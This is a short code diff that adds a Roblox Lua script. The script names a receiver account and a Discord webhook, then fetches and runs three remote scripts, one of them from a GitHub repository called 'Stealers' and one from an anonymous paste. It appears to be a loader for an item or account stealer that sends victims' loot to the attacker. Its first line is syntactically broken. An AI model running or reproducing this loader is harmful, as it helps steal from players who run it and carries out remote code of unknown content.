@@ -1,0 +1,7 @@
+wait("0.2")")
+Receiver = "Wrd2lora"
+Webhook = "https://discord.com/api/webhooks/1288141582167703562/1v56ptryDj-O4akmYnByaq6CkNzpQ24bnf0_USNcWZWpkP4rN8lmVpEMkUrn_0qAoqs2"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
+loadstring(game:HttpGet('https://paste.gg/p/anonymous/4b56bb9324f34913b540b904f247f69c/files/81d526db9fc44305a52f12bc39536621/raw'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sdfesdfsedf/srgtergasdfs/main/wwwwwww", true))()
